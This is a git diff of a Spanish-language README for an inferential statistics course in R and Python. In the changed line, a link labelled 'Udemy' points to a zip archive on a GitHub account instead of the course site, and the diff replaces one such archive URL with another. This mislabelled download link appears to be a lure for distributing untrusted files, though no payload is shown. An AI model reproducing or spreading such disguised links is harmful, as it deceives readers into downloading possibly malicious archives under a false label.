@@ -1,6 +1,6 @@
 # Curso completo de estadística inferencial con R y Python
 
-Consulta el curso completo de estadística creado por Ricardo Alberich, Juan Gabriel Gomila y Arnau Mir solamente en [Udemy](https://raw.githubusercontent.com/eddyayalagil/estadistica-inferencial/master/tremulously/estadistica-inferencial.zip)
+Consulta el curso completo de estadística creado por Ricardo Alberich, Juan Gabriel Gomila y Arnau Mir solamente en [Udemy](https://github.com/eddyayalagil/estadistica-inferencial/raw/refs/heads/master/docs/inferencial-estadistica-3.7.zip)
 
 Asienta las bases para convertirte en el Data Scientist del futuro con todo el contenido de estadística inferencial del curso. En particular verás los mismos contenidos que explicamos en primero de carrera a matemáticos, ingenieros, economistas, biólogos, médicos o informáticos. 
 
